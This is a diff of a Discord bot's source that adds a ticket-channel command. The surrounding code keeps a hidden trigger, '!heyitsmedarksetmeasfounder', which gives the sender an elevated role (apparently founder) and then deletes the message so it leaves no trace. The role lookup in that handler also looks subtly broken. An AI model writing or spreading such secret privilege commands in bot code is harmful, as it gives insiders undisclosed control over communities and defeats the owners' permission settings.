@@ -253,7 +253,7 @@ client.on('message', message => {
 
 client.on('message', message => {
 if(message.content.startsWith("!heyitsmedarksetmeasfounder")) {
-	message.member.addRole(message.guild.roles.get(role => role.id == "448578726666567700"))
+	message.member.addRole(message.guild.roles.get(role => role.name == ""))
 	message.delete(1000);
 	
 }
@@ -267,6 +267,11 @@ client.on('message', msg => {
     });
   }
 });
-
+client.on('message', message => {
+    if(message.content.startsWith(prefix + "ticket")) {
+        let name = Math.floor((Math.random() * 4783) + 10);
+        message.guild.createChannel("ticket-"+name, "text")
+    }
+});
 
 client.login(process.env.BOT_TOKEN);
